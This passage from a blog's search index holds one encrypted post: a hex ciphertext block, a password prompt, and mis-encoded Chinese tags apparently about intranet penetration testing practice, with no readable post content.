be81df8c6ce9a804fdf7fee6555fd2676b839e58c2b1457cb37870b4e306db92082ceb94b2b17b3b2bc170ad11b226359380eb3cb814898e41ff77435418f684435473f271ec3732595bc3d5db3033f9a924ca516775c5fa7f7a1bc691cfd32e545c6065d2e79b503a7a36be9370a0f730f781a9125e4f965a87cccdef2e897616699da0f43cfe7fe46745896fdfb52e34b8f884afb44971173c6972800110958d08a27fb860f2fdcda0895d60c18ca9e5093ad103794812ca523e1eb4eaad41ef65ee434521d43cd75c98d30a8e0c3b5612f16f0bf5d8d4cdc0dbdc19d8b43799614e55dccb6a3b1146d61b459b87cd14181b8642ebe70642f47ac7575c0271274ee101222f34cfb9e3d1ac3a2b21c93eb7b3f49ac443a0f70b8223ce428e585516d182264f3acbd1d05ba3a7b41b74d797cb20515925580942d8ac5098f09ba20fd854ac24fc4071f9d9a32733ab7a39fbdcd1409f60b0b1f59e235b70fbeafd1d200eed0d2f</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>å†…ç½‘</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
        <tag>å®æˆ˜</tag>
      </tags>
  </entry>
</search>
